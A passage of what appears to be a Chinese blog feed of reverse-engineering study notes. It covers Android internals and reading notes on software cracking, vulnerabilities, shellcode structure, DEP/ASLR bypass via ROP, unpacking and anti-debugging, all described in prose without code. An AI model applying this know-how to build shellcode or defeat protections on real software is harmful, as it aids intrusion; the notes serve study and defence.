title="Dalvik和ART"></a>Dalvik和ART</h4><p>Dalvik虚拟机中运行的是Dalvik字节码（文件格式.dex），语法较复杂，通过对其反汇编能够得到smali汇编代码，阅读会轻松不少。Dalvik=机器码，smali=汇编，Java/Kotlin=高级语言。</p><p>其编译使用JIT技术，JIT=即时编译/动态编译：运行时将字节码翻译为机器码。包括两种字节码编译方式</p><ul><li>method：以函数或方法为单位编译</li><li>trace：实际运行中多被运行的分支路径（热路径）能够被更快获取，将这些代码编译成本地机器相关的机器码，之后缓存起来</li></ul><p>Dalvik虚拟机运行机器码</p><ol><li>完成类的装载</li><li>全局哈希表存储类（类被统一为ClassObject类型）</li><li>字节码验证器对装入的代码校验</li><li>虚拟机调用<code>FindClass()</code>查找并装载main方法类</li><li>初始化解释器执行字节码流</li></ol><p>在Android5.0之后开始用ART虚拟机进行替代，Dalvik每次都需要将apk代码编译成机器码再运行，而ART只有首次启动时进行编译。此外ART虚拟机还添加了AOT，可以在安装apk时将.dex文件直接处理成可以直接供ART虚拟机使用的.oat文件，而且ART的垃圾回收机制更好</p><h4 id="Android可执行文件"><a href="#Android可执行文件" class="headerlink" title="Android可执行文件"></a>Android可执行文件</h4><p>apk即压缩包，解压后其由资源与文件构成，每个apk必定对应一个classes.dex，该文件就是Dalvik虚拟机下的可执行文件。apk打包过程如下：</p><ol><li>aapt首先检查AndroidManifest.xml的合法性——》对res目录下的资源子目录处理（检查并添加资源表条目）——》编译res与asserts目录下的资源并生成resources.arsc文件——》生成.java——》对res目录下的xml文件进行编译+resources.arsc+加密过的AndroidMainfest.xml打包压缩成resources.ap__</li><li>编译src目录下的java/c/cpp源码，生成相应的class文件</li><li>dx转换所有的class文件生成classes.dex</li><li>apkbuilder以ap__结尾的文件为基础生成apk文件——》向apk中添加res、assets目录中的资源——》添加libs目录下C/Cpp生成的.so/.bin依赖库</li><li>对apk文件进行签名</li><li>对签名后的apk文件进行对齐处理</li></ol><p>APK文件通常包括如下文件：</p><ul><li>meta-inf目录：<ul><li>manifest.xml清单文件</li><li>cert.rsa应用签名文件</li><li>cert.sf资源列表及对应的sha-1签名</li></ul></li><li>lib目录包括平台相关的库文件</li><li>res是没有被编译到resources.arsc中的其他资源文件</li><li>asserts文件指能通过AssertManager访问到的资源文件</li><li>AndroidManifest.xml是组件清单文件，包含应用名字、版本、权限等信息</li><li>classes.dex是应用程序运行时的可执行文件，也是反汇编的主要目标</li><li>resources.arsc包含编译好的部分资源文件</li></ul><p>dex文件格式如下</p><ul><li>header：dex文件头，记录当前文件信息以及其他数据结构的文件偏移。</li></ul><div class="table-container"><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>Magic value</td><td>魔数，跟所有文件一样就是文件头用来表示该文件类型。占32位，换位ASCII码就是“dex.035.”</td></tr><tr><td>checksum</td><td>检验和，用于判断文件是否被</td></tr><tr><td>sha1签名</td><td>整个dex文件使用SHA-1进行签名，占据20字节</td></tr><tr><td>fileSize</td><td>整个dex文件的大小</td></tr><tr><td>headerSize</td><td>文件头结构的大小</td></tr><tr><td>endian_tag</td><td>大端小端，默认都是小段</td></tr><tr><td>link_size&amp;link_off</td><td>指定了链接段的大小和文件偏移，通常情况下他们都是0，linkSize为0表示为静态链接</td></tr><tr><td>mapoff</td><td>表示DexMapList的文件偏移</td></tr><tr><td>stringIdsSize&amp;stringIdsOff</td><td>指定了dex文件中所有用到的字符串的个数和位置偏移，注意这里指的是位置偏移，而不是真正的字符串值</td></tr><tr><td>typeIds&amp;typeIdsOff</td><td>有了上面字符串保存的逻辑，这个就是类的类型的数量和位置偏移，也都是占用4个字节</td></tr><tr><td>protoIdSize&amp;protoIdOff</td><td>方法原型的个数和位置偏移</td></tr><tr><td>fieldSize&amp;fieldOff</td><td>java文件中字段的信息</td></tr><tr><td>methodSize&amp;methodOff</td><td>方法大小及其偏移</td></tr><tr><td>classDefsSize&amp;classDefsOff</td><td>类定义的相关信息，类的信息就比较多了，包括类的修饰符、父类、接口、注解、静态元素等等</td></tr><tr><td>dataSize&amp;dataoff</td><td>数据区的大小以及偏移</td></tr></tbody></table></div><ul><li><p><code>string_ids</code>、<code>type_ids</code>、<code>proto_ids</code>、<code>field_ids</code>、<code>method_ids</code>、<code>class_def</code>：字符串、类型信息、方法声明、字段信息、方法信息、类信息等的偏移量</p></li><li><p>data：数据区，存放上面所说内容</p></li><li><p>link_data：静态链接数据区</p></li><li><p>需要注意，和linux下elf一样，文件结构和在内存中的结构不大一样，内存中的结构保存的是各个结构的指针</p></li></ul><p>上面仅仅是普通的Dalvik的dex格式，下面是一些其他的执行文件格式</p><ul><li><p>odex文件即优化的dex，该文件已经包含了dex文件需要的依赖库列表，方便Dalvik虚拟机检测加载。</p><blockquote><p>odex=odex文件头+dex文件+依赖库+辅助数据</p></blockquote></li><li><p>ART虚拟机中的oat文件中有完整的dex文件，也同时是一个ELF格式文件，内部多了oatdata、oatexec、oatlastword几个符号，oatdata和oatlastword分别指定了oat文件在elf文件中的头和尾的位置，符号oatexec指向可执行段的位置。</p><blockquote><p>ELF文件中的oat data section 中对应着真正的oat文件，而oat中包含着完整的dex </p></blockquote></li></ul><h4 id="安卓相关流程"><a href="#安卓相关流程" class="headerlink" title="安卓相关流程"></a>安卓相关流程</h4><blockquote><p>以Dalvik为例子</p></blockquote><p>安卓虚拟机启动大致过程：</p><ol><li>加载内核</li><li>执行init进程，进行初始化工作</li><li>读取inic.rc文件并启动<strong>孵化器进程Zygote</strong></li><li>启动后先初始化Dalvik虚拟机</li><li>启动system_server并进入Zygote模式，通过socket等候命令</li></ol><p>运行程序：</p><ol><li>system_server进程通过socket方式发送命令给Zygote</li><li>Zygote收到命令fork自身创建一个Dalvik虚拟机来执行应用程序</li><li>加载APK：首先Android系统会加载应用程序的 APK 文件，读取其中的 DEX 文件（Dalvik 虚拟机）或 OAT 文件（ART）  </li><li>加载类和资源：随后，虚拟机将加载应用程序的类文件和资源文件，例如布局、图片等  </li><li>执行字节码：接着，虚拟机将执行应用程序的字节码。在此过程中，虚拟机会根据字节码调用相应的系统 API，完成应用程序的功能  </li><li>垃圾回收：在执行过程中，虚拟机会周期性地进行垃圾回收（GC），回收不再使用的内存。ART 采用了分代垃圾回收策略，进一步优化了内存管理  </li></ol><p>Zygote的三种创建进程方式</p><ul><li>fork：创建Zygote进程，可以再向下fork</li><li>forkAndSpecialze：创建一个非Zygote进程，不能fork</li><li>forkSystemServer：创建一个系统服务进程，该进程终止后子进程也必须终止</li></ul><h4 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h4><ul><li><p>命名：ARM7-9-11，之后就到了Cortex的命名方式，包括Cortex-A/M/R，目前常见的就是A系列，M系列针对微控制器，R系列面向深层嵌入式</p></li><li><p>架构：架构版本ARMv1-v10等，在v4之后，加入了16位指令模式，叫做thumb指令集，只具备通用功能。在v8开始，提供了32和64位两种执行状态</p></li><li><p>ARM处理器7种运行模式：用户模式、快速中断模式、外部中断模式、管理模式、数据访问终止模式、系统模式、未定义指令的终止模式（除了第一个都是特权模式，此时系统资源访问不受限）</p><ul><li>在用户模式下不分组寄存器R0-R7、分组寄存器R8-R14、程序计数器R15、当前状态寄存器CPSR</li><li>用户状态工作状态：ARM状态（32位对齐）、Thumb状态（16位对齐）</li></ul></li><li><p>ARM汇编支持的寻址方式：立即寻址、寄存器寻址、寄存器移位寻址（特有！操作前需要对源寄存器进行移位操作）、寄存器间接寻址、基址寻址、多寄存器寻址、堆栈寻址、块拷贝寻址、相对寻址</p><blockquote><p>还有用于多媒体编程的NEON指令集，用于浮点运算的VFP指令集等</p></blockquote></li></ul><h4 id="分析！"><a href="#分析！" class="headerlink" title="分析！"></a>分析！</h4><p>NDK介绍：</p><ul><li><p>NDK类似于SDK即开发工具包，但是不同的是，NDK用于编写C/Cpp程序，之后被编译为so库之后，与其他的Java代码一块被打包到Apk中，而Java等代码通过JNI来与我们编写的so库进行连接，从而使用原生的速度，而不需要再经过Dalvik虚拟机翻译。</p><blockquote><p>C代码总是要比同等级下Java代码更难逆向（而且会更难），因此so库，也就是Native层会逆向难度会较大</p></blockquote></li><li><p>对于Cpp来说，其STL库、异常处理机制库等可以通过更改Application.mk中的链接库设置进行更改</p></li></ul><p>虚拟机调试：</p><ul><li><p>Dalvik虚拟机实现JDWP（Java调试有线协议），每个Dalvik实例都会启动一个JDWP线程，该线程一直处于空闲状态，直到DDMS（Dalvik调试监控器服务）或者调试器连接，之后处理调试器发送过来的请求</p><blockquote><p>DDMS在AndroidSDK中有，可以进行文件浏览、输出软件运行时调试信息、跟踪程序的执行流程等</p></blockquote></li></ul><p>反编译apk：</p><ul><li><p>一个安卓程序由一个或多个Activity（页面）以及其他组件构成，有且仅有一个主Activity，也是第一个启动的。在Mainfest中“android:name=’.MainActivity’ ”，找到后查看其所在类的OnCreate方法，也即程序代码入口</p></li><li><p>反编译后会在smali文件中生成相应的smali汇编，‘.class’指定类与访问权限；‘.super’指定当前类的父类；‘.source’指定当前类源文件</p></li></ul><div class="table-container"><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>.fields 权限 static</td><td>静态字段</td></tr><tr><td>.fields 权限</td><td>实例字段</td></tr><tr><td>.method</td><td>类中方法</td></tr><tr><td>.implements + 接口名</td><td>类的接口</td></tr><tr><td>.annotation</td><td>注释</td></tr></tbody></table></div><p>Tool：dex2jar（虚拟机字节码转为java代码）、JAD（java反汇编）、Frida（hook工具）、JEB（类似于ida）</p><h4 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h4><ul><li>Activity：面向用户的应用组件或者可视化界面，由ActivityManager统一管理</li><li>Broadcast Receiver：接受并过滤广播消息的组件，应用想显示的接收广播消息，需要在Manifest清单文件中注册一个receiver</li><li>Service：用于处理后台耗时逻辑</li><li>Content Provider：应用程序之间数据共享的组件</li></ul><h4 id="Binder"><a href="#Binder" class="headerlink" title="Binder"></a>Binder</h4><p>两个不同进程没有办法互相访问彼此的内存地址来访问对方内部的函数或变量，在Android中就有了Binder机制， Binder是一种IPC（进程间通信）的具体实现，主要充当中间人的作用，将消息从A进程传递给B进程。</p><p>Binder主要含有两部分Binder驱动和ServiceManager，如果加入通信双方就是BinderClient和BinderServer，也就是传统的C/S模型。</p><ul><li>Client进程：使用服务的进程</li><li>Server进程：提供服务的进程 </li><li>ServiceManager进程：管理Service注册与查询，将字符形式的Binder名字转换成对Client中对该Binder的引用 </li><li>Binder驱动：一种虚拟设备，是连接上述三者之间的桥梁。具体作用是：传递服务进程消息、通过内存映射传递进程间需要传递的数据、采用Binder线程池并由Binder驱动自身进行管理  </li></ul><p>首先我们的ServerB作为服务端需要通过Binder驱动来向ServiceManager注册服务——》ServiceManager会为其进行注册，并分配相应名称。</p><p>ClientA想要与ServerB通信，但是A并不知道B的具体地址，但是仅知道B对应的Binder名称，于是就到ServiceManager中查询——》ServiceManager返回B的对应内存地址——》A根据获得的地址通过Binder驱动来向B通信。  </p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《加密与解密》读书笔记2</title>
      <link href="/2024/05/03/%E5%8A%A0%E8%A7%A3%E5%AF%862/"/>
      <url>/2024/05/03/%E5%8A%A0%E8%A7%A3%E5%AF%862/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞篇"><a href="#漏洞篇" class="headerlink" title="漏洞篇"></a>漏洞篇</h2><h4 id="二进制漏洞"><a href="#二进制漏洞" class="headerlink" title="二进制漏洞"></a>二进制漏洞</h4><p>C语言中<code>strcat()</code>、<code>strcpy()</code>、<code>sprintf()</code>、<code>vsprintf()</code>、<code>bcopy()</code>、<code>gets()</code>、<code>scanf()</code>等函数的不当使用（主要是指针数组的越界保护）都会造成溢出</p><ul><li><p>缓冲区溢出漏洞</p><ul><li>栈溢出：栈中保存了函数需要的重要信息，并在函数执行结束时被释放。程序借助栈将参数传递给子函数。其中也保存着局部变量、函数返回地址等。与栈帧结构密切相关</li><li>堆溢出：由开发人员自行分配释放。堆向高地址扩展，是不连续的内存区域，由系统使用链表来管理空闲的内存块，链表的遍历由低地址向高地址进行</li><li>格式化字符串溢出：<code>printf()</code>不定参数输入，而且不会检查参数个数</li></ul></li><li><p>整数溢出漏洞</p><ul><li>存储溢出：不同的数据类型存储造成，不完全覆盖或是高位截断</li><li>运算溢出：在对整型数变量进行运算过程中没有考虑边界问题</li><li>符号问题：有符号整型和无符号整型</li></ul></li><li><p>UAF漏洞：堆被释放后又被使用。利用方法=在堆被释放后赶紧申请内存，企图占据那块刚被释放的堆块，后面调用已被释放的位置指针指向的堆块就被控制了</p></li></ul><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>shellcode是一段可独立执行的代码，用于实现对计算机端的控制。通常在缓冲区漏洞触发后，获取eip指针控制权，之后指向shellcode执行</p><blockquote><p>Poc证明样本可以导致程序崩溃；Exp主要是漏洞利用</p></blockquote><p>shellcode分为两个模块=基本模块+功能模块</p><ul><li>基本模块<ul><li>获取kernel32基址：常见的有暴力搜索、异常处理链表搜素、TEB搜索</li><li>获取API地址：找到dll之后按照PE结构搜索EAT。可以通过计算字符串的hash值来对比，既减小了空间又不容易被看穿</li></ul></li><li>功能模块<ul><li>下载执行：从指定url下载exe并执行。常见于浏览器类漏洞</li><li>捆绑：将捆绑在自身身上的exe数据释放到指定目录中。常见于office等漏洞</li><li>反弹shell：获取一个远程shell以执行命令。多见于主动型远程溢出漏洞</li></ul></li></ul><p>编写shellcode：强大的汇编、winAPI等</p><p>提取shellcode：一般是利用十六进制编译器直接提取编译生成的exe对应区段。当然可以使用代码自动化，提取为bin、C数组、unescape等格式</p><p>调试shellcode：内联汇编编写时方便调式。如果是bin格式则需要自己编写loader</p><p>shellcode变形：格式变化、字符串化、加密</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>shellcode可能出现位置</p><ul><li>jmp esp/call esp：保存在栈空间的shellcode一般都是用此来控制eip。jmp esp编码“0xFF 0xE4”</li><li>jmp ebx/call ebx：当栈溢出发生后，如果覆盖的是无效地址，那么系统就会进入到异常处理过程</li><li>堆喷射：常见于UAF的利用，因为一般只能控制eip，而shellcode无法写入指定内存，所以一般采用脚本循环申请的方式连续填充内存，从而实现布局</li></ul><p>DEP保护：即数据执行保护，需要硬件页表机制的支持。该机制会将非代码段的页表属性设置为“不可执行”，这样写入的shellcode就不会得到运行</p><p>绕过DEP：ROP编程—主要借助代码复用技术，即需要其他可执行位置上，比如已有的动态链接库和可执行文件等，从中找到符合要求的指令片段，这些片段以ret结尾，将其逻辑上拼接为我们的程序</p><blockquote><p>ROP通常操作是调用<code>VirtualProtect()</code>将shellcode区域设置为可执行，或是通过<code>VirtualAlloc()</code>来申请一段可执行的空间</p></blockquote><p>ASLR：对堆、栈、共享库等映射区域进行随机化处理，针对缓冲区溢出和ROP的安全保护技术。常见绕过就是在未启用ASLR的模块中寻找跳板</p><h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><ol><li><p>样本获取、环境搭建</p></li><li><p>静态分析：样本信息、查杀测试、搜索引擎、二进制分析</p></li><li>动态调试：运行测试、<strong>动态调试</strong></li><li>溯源：定位漏洞触发位置</li></ol><h2 id="脱壳篇"><a href="#脱壳篇" class="headerlink" title="脱壳篇"></a>脱壳篇</h2><h4 id="壳介绍"><a href="#壳介绍" class="headerlink" title="壳介绍"></a>壳介绍</h4><p>外壳通过附加在原始程序上，通过加载器载入内存后，先于原始程序被执行，用以获得控制权，在执行过程中对原始程序进行解密还原，还原之后把控制权还给原始程序执行原来的代码</p><ul><li><p>压缩壳：用于减小软件的体积。UPX、ASPack、PECompact</p></li><li><p>加密壳：一些壳只保护程序，另一些会有额外的功能。ASPPotect、Armadillo、EXECryptor、Themida</p></li><li>虚拟机保护软件：虚拟机引擎由编译器、解释器和虚拟CPU环境组成，还会搭配一个或多个指令系统。VMProtect—一个利用伪指令虚拟机的保护软件，安全性高，但效率会变低</li></ul><h4 id="壳的加载"><a href="#壳的加载" class="headerlink" title="壳的加载"></a>壳的加载</h4><ol><li>加壳程序在初始化时保存各寄存器的值，外壳执行完后再恢复</li><li>输入壳一般只有<code>GetProcAddress()</code>、<code>GetModuleHandle()</code>、<code>LoadLibrary()</code>三个API，或者平替功能的函数</li><li>解密源程序各个区块的数据</li><li>源程序的IAT初始化由壳进行填写</li><li>重定位项预处理，exe会比dll少一个重定位表</li><li>Hook-API，壳一般都会自己模仿win的工作流程，向输入表中填入自己的hook地址</li><li>跳转到程序原入口点OEP，是源程序和壳的“分界线”</li></ol><blockquote><p>OEP即原程序入口点，也就是壳执行完后将控制权还给解压后的程序，再跳入到原程序</p></blockquote><h4 id="EXE脱壳"><a href="#EXE脱壳" class="headerlink" title="EXE脱壳"></a>EXE脱壳</h4><ol><li><p>寻找OEP</p><ul><li>根据跨段指令寻找OEP：加壳之后程序称为“RebPE”，外壳部分所在段会作为新的入口点，而非常见的代码段，之后动态调试，从壳开始处跟踪</li><li>用内存访问断点寻找OEP：对代码段设置内存断点，当壳对断点指令进行读取时必定会发生中断</li><li>根据栈平衡寻找OEP：壳在JMP OEP之前必定会<code>popad/popfd</code>来将初始化时保存的寄存器恢复</li><li>根据编译语言特点寻找OEP：例如MSVC的入口点<code>mainCRTStartup</code>、<code>WinMainCRTStartup</code>等函数，据此来设置断点</li></ul></li><li><p>抓取内存镜像</p><ul><li><p>也叫dump——转存，是指把内存指定地址的映像文件读出，用文件形式保存下来。当外壳来到OEP处进行dump才合适，否则程序运行时变量就会被初始化</p><blockquote><p>工具：LordPE、PETools。一般利用<code>Module32Next()</code>获取欲dump进程的信息<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-module32next">Module32Next 函数 (tlhelp32.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li><li><p>反dump：</p></li><li><p>纠正SizeOfImage：在dump文件时，一些关键参数是通过MODULEENTRY32结构的快照获得的，一些壳会修改其中的参数使dump软件无法正常读取数据</p></li><li><p>修改内存属性：当进程某个地址不可读时就无法进行dump，此时就需要动态调试时将PE头设置为完整权限</p></li></ul></li><li><p>重建输入表</p><ul><li>当外壳代码完成了加载工作，此时源程序中的IAT填写的就是外壳的hook-API地址了，所以每次程序与系统打交道时都会让外壳的代码获取一次控制权。</li><li>程序中每一个API函数在IAT中都会有自己的位置，通过动态调试，跟踪函数调用，从而来到IAT所在位置，IAT是一块连续排列的数据，以0结尾，据此特征查找。</li><li>重启跳转到OEP处，将内存数据dump出来为一个单独的exe，之后整理字符串、偏移等结构。完成后再由windows加载器实现IAT地址的填充</li><li>外壳对输入表的操作：</li><li>保留原输入表，外壳加载时没有加密IAT：外壳解压数据时，完整的输入表会在内存中，dump下来即可。这种外壳一般都是用显式装载的方式来获得函数地址的。ASPack、PECompact</li><li>保留原输入表，外壳装载时加密IAT：需要在外壳没加密之前进行dump，会直接跳过IAT加密代码段。tElock</li><li>破坏原输入表，外壳装载时没有加密IAT：外壳刚解压的文件中（内存数据）的是输入函数的字符串，之后外壳用显式装载的方式获得这些函数地址。UPX</li><li>破坏原输入表，装载时对IAT加密处理：综上。ASProtect</li></ul></li></ol><h4 id="DLL文件脱壳"><a href="#DLL文件脱壳" class="headerlink" title="DLL文件脱壳"></a>DLL文件脱壳</h4><p>比exe脱壳多了一个基址重定位表需要考虑</p><ol><li><p>寻找OEP：dll在映射和卸载时都会调用到<code>DllMain()</code>。因此可以在载入时/退出时寻找OEP。借助<code>LoadLibrary()</code>与<code>FreeLibrary()</code>来映射卸载dll。</p><blockquote><p>应该也是可以使用rundll32.exe来跟踪执行</p></blockquote></li><li><p>Dump：需要注意dll的重定位问题，如果是重定位后抓取需要将基址进行修正。</p></li><li><p>重建输入表：同上步骤/工具</p></li><li><p>构造重定位表：外壳重定位相关数据时，会根据外壳转储的重定位表确定要重定位的RVA，用RVA+基址来完成重定位工作。因此重点就是将外壳中这些要重定位的RVA提取出来，重新生成一份重定位表</p></li></ol><h4 id="PE文件优化"><a href="#PE文件优化" class="headerlink" title="PE文件优化"></a>PE文件优化</h4><ul><li>输入表用工具重建后，默认是放在新增的区块，而一般是在.rdata区块的，在其中选一块地址存放</li><li>资源重建：工具脱壳后，图标等内容因为不能被压缩，而被存放在外壳的代码中。工具freeRes、DT_ResFix。</li><li>装配文件：删除不必要的区块数据。工具：LordPE、CEF Explorer</li><li>修正PE文件头<ul><li>EntryPoint：脱壳时的OEP，工具能自动修正</li><li>BaseOfCode/Data：代码段/数据段起始地址</li><li>SizeOfImage：装入文件从基址到最后一个块的大小</li></ul></li></ul><h2 id="保护篇"><a href="#保护篇" class="headerlink" title="保护篇"></a>保护篇</h2><h3 id="软件保护技术"><a href="#软件保护技术" class="headerlink" title="软件保护技术"></a>软件保护技术</h3><h4 id="防范算法求逆"><a href="#防范算法求逆" class="headerlink" title="防范算法求逆"></a>防范算法求逆</h4><p>验证用户合法性环节如下：</p><ol><li>用户向软件作者提交用户码U，申请注册</li><li>软件作者经注册机计算出注册码 R=f(U)，并返回R</li><li>用户在注册界面输入用户码U和注册码R</li><li>软件通过验证函数 F(U,R) 来判断上述值是否合法</li></ol><blockquote><p>堡垒战术：MD5等hash进行身份验证+RSA等公钥加密算法</p><p>游击战术：核心思想“化整为零”+“虚虚实实”+“战略转移”，将验证函数分解成不同的函数，并将其分别隐藏到程序中、加入干扰函数、软件给注册码反复换地方（写入注册表/文件、多份备份等）</p></blockquote><h4 id="抵御静态分析"><a href="#抵御静态分析" class="headerlink" title="抵御静态分析"></a>抵御静态分析</h4><p>目前主要的反汇编算法：线性扫描算法（OD、windbg）、递归行进算法（OD、IDA）</p><ul><li>线性扫描算法：将模块中的每条指令都反汇编，遇到的机器码都作为代码处理</li><li>递归行进算法：按照代码可能执行的顺序进行返汇编，对每条可能的路径进行扫描</li></ul><p>分析手段根据返汇编算法有如下几种</p><ul><li><p>花指令：无用的字节干扰返汇编工具对指令位置的判断</p></li><li><p>SMC技术：代码自修改技术。某段代码在执行之前进行加密——》程序执行时动态解密。可以与反跟踪、反断点跟踪相结合；设计出多层嵌套；设计一个比较复杂的解密函数；</p></li><li><p>信息隐藏：对关键信息，比如常用于定位的界面显示的字符串，进行隐藏处理</p><blockquote><p>病毒资料：<a href="https://1vx.ug/archive/VxHeaven/">Welcome to VX Heaven! (1vx.ug)</a></p></blockquote></li></ul><h4 id="文件完整性检验"><a href="#文件完整性检验" class="headerlink" title="文件完整性检验"></a>文件完整性检验</h4><p>文件发布时用散列函数计算文件的散列值，并将其存放到某个位置，之后每次运行重新计算并比较</p><ul><li>磁盘文件校验：书中用的是CRC32检验码，可以将该校验码存放到文件中，或是单独文件</li><li>校验和：PE可选映像头中有个“Checksum”字段，其中存储了文件的校验和。EXE的可以0，重要文件、系统dll、驱动不能为0。IMAGEHLP.dll下<code>MapFileAndCheckSumA()</code>可以来测试</li><li>内存映像校验：可以对代码块计算，或选其中一小部分，因为此段在运行期间只读。需要注意断点设置，硬件断点不影响，而INT 3会改变原始代码</li></ul><h4 id="代码与数据结合"><a href="#代码与数据结合" class="headerlink" title="代码与数据结合"></a>代码与数据结合</h4><ol><li>在软件中找一段密文C（可以是关键代码或是注册版下某个功能的关键数据）</li><li>用户输入用户名和序列号之后，计算解密密钥K=F(用户名，序列号)</li><li>对密文进行解密M=Decrypt(C, K)</li><li>给解密的代码加上异常处理代码（K不对的话，得到的M就是不正常的）</li><li>利用散列函数计算M的校验值，并检验</li></ol><h3 id="反跟踪技术"><a href="#反跟踪技术" class="headerlink" title="反跟踪技术"></a>反跟踪技术</h3><p>防调试器、防监控工具等</p><ol><li><p>BeingDebugged</p><ul><li>winapi<code>IsDebuggerPresent()</code>来判断自己是否处于调试状态</li><li>段寄存器fs:[0]指向当前线程环境块TEB——》其中存储了进程环境块PEB的地址——》读取PEB的BeingDebugged标志</li><li>系统在创建进程时设置“BeingDebugged=TRUE”——》“NtGlobalFlag=0x70”——》在为进程创建堆时，由于“NtGlobalFlag”的作用，堆的“Flags”被设计了标记——》“Flags”被填充到“ProcessHeap”的“Flags”和“ForceFlags”中——》堆内填充了许多“BA AD F0 0D”，检测出有调试器</li></ul></li><li><p>Native用户态</p><ul><li><p><code>CheckRemoteDebuggerPresent()</code>也可以用于检测调试器，与<code>IsDebuggerPresent()</code>不同并不是检测“BeingDebugged”标志的</p></li><li><p>该函数调用——》<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess">NtQueryInformationProcess 函数 (winternl.h)</a>——》根据其中不同的“ProcessInformationClass”查询进程对象信息，调试状态下就是“ProcessDebugPort”，该值用来与调试器通信的端口句柄（如果将调试端口设置为0，系统就不会向用户态调试器发送调试事件通知，调试器就无法正常工作）</p></li><li><p>可以使用<code>ZwSetInformationThread()</code>来防调试</p><blockquote><p>逆向网站<a href="https://www.openrce.org/about/">OpenRCE的 —- OpenRCE</a></p><p>NativeAPI<a href="https://bbs.kanxue.com/thread-112348.htm">[下载][分享]经我自己编辑过的《Windows NT 2000 Native API Reference.chm》-¥付费问答-看雪</a></p></blockquote></li></ul></li><li><p>windows调试机制</p><ul><li><p>调试器与被调试程序有两种途径建立关系：创建进程时设置DEBUG_PROCESS；调用DebugActiveProcess附加到某个已经运行的进程上</p><blockquote><p><a href="https://bbs.kanxue.com/thread-268988.htm">[原创]初探Windows调试原理和反附加手段-软件逆向-看雪</a></p></blockquote></li></ul></li><li><p>NativeAPI</p><ul><li><p>winNT对旧系统，其中有相应的支持子系统，各个子系统转入ntdll或内核中的ntoskrnl，最终在硬件抽象层HAL上实现。这样在设计子系统时对ntdll提供的接口封装即可或调用0x2e中断进入到ntoskrnl.exe内核态</p></li><li><p>SSDT-系统服务描述表/SDT-服务描述表，其中存放了SST-系统服务表</p></li><li><p>在ntdll.dll中Zw和Nt都是导向ntoskrnl.exe的Stub函数</p></li><li><p>在ntoskrnl.exe中，Zw函数也是Stub函数，指向ntoskrnl.exe的相应Nt函数</p></li><li><p>在ntoskrnl.exe中，Nt函数时所有Stub函数的目的地</p><blockquote><p>stub函数：<a href="https://blog.csdn.net/qq_25147897/article/details/78855860">[浅谈白盒测试中桩函数的灵活应用_桩函数中if怎么实现-CSDN博客]</a></p></blockquote></li></ul></li><li><p>反调试技巧</p><ul><li>SoftICE内核级调试器：使用<code>CreateFileA()</code>或<code>_lopen()</code>来获得SoftICE驱动程序等的句柄；在winNT中，SoftICE是一个内核设备驱动类型的服务（叫NTICE）</li><li>OD：检测OD的特征码；调试器一般使用微软的DBGHELP库来装载调试符号；查找窗口是否有od相关信息；枚举进程列表ollydbg.exe；</li><li>调试器漏洞：利用调试器漏洞攻击</li><li>防止调试器附加：Ring3调试器附加使用<code>DebugActiveProcess()</code>，在附加相关进程时会先执行ntdll.dll下的<code>ZwContinue()</code>，最后停留在ntdll.dll的DbgBreakPoint处，调试器在这里设置了一个INT 3断点，由调试器自己捕捉</li><li>父进程检测：通过TEB或<code>GetCurrentProcessId()</code>获取当前进程PID——》通过<code>Process32First/Next</code>获取所有进程列表——》判断父进程PID是不是exploer.exe、cmd.exe、Services.exe，不是的话就可能正在被调试</li><li>时间差：当程序运行被打断点的话，会经过CPU捕获异常发给调试器处理等步骤，耗时不合理就是被调试了。<code>RDTSC</code>指令用于获取CPU自开机运行起的时钟周期数（<code>kernel32!GetTickCount()</code>也可）</li><li>通过TrapFlag检测：CPU符号位eflags中，有一位TF=1时，CPU执行eip中的指令后会触发一个单步异常</li><li>双进程保护：win下Ring3调试器和被调试程序，一对一关系，可以自己写一个调试器附加上去</li></ul></li></ol><h3 id="外壳编写基础"><a href="#外壳编写基础" class="headerlink" title="外壳编写基础"></a>外壳编写基础</h3><p>加壳工具=主体程序（原文件读入内存并加工）+外壳部分（加壳后程序执行时的引导段，用于模拟PE装载器）</p><h4 id="加壳主程序"><a href="#加壳主程序" class="headerlink" title="加壳主程序"></a>加壳主程序</h4><ol><li>判断文件是否是PE格式：检测DOS+PE文件头的魔数——》校验FileHeader结构中的Characteristics字段来判断是exe还是dll</li><li>文件基本数据读入：（也可直接按文件偏移方式读入）仿照装载器载入——》取得PE文件头SizeOfImage字段的值，并申请相应大小内存——》根据区块表中的VA和VirtualSize逐区读入</li><li>附加数据的读取：需要在读取文件时单独读取并保留这些数据——》加密后追加到文件的最后</li><li>输入表处理：加密进行时破坏源程序中的输入表，换一个形式存储——》在外壳对源程序初始化时，不把真正的函数入口写回输入表，而是写入外壳中的一段程序入口，从这些位置转到正确的函数入口</li><li>重定位表处理：对于dll文件，外壳需要模拟PE装载器的重定位功能，将原始的重定位表换一个形式存储。对于exe一般就顶多减小体积而已</li><li>文件的压缩：压缩引擎aPlib、LZMA、JCALG1。有些区块诸如资源块等需要特殊处理</li><li>资源数据处理：找到资源目录和资源数据的分割点——》把不能压缩的资源类型从中提取，转移到一个不会被压缩的空间中——》修改资源目录中相应指针——》压缩资源区块中的资源数据</li><li>区块的融合：各个区块长度必须是FileAlignment的倍数，不足部分00填充，将一些可以压缩的区块合并为一个区块——》根据区块名找到第一个不能被压缩的区块——》合并区块——》合并后的区块的RVA设置为融合的第一个区块的RVA——》VirtualSize设置为和——》没有融合的区块的区块表向前移动</li></ol><h4 id="汇编编写外壳部分"><a href="#汇编编写外壳部分" class="headerlink" 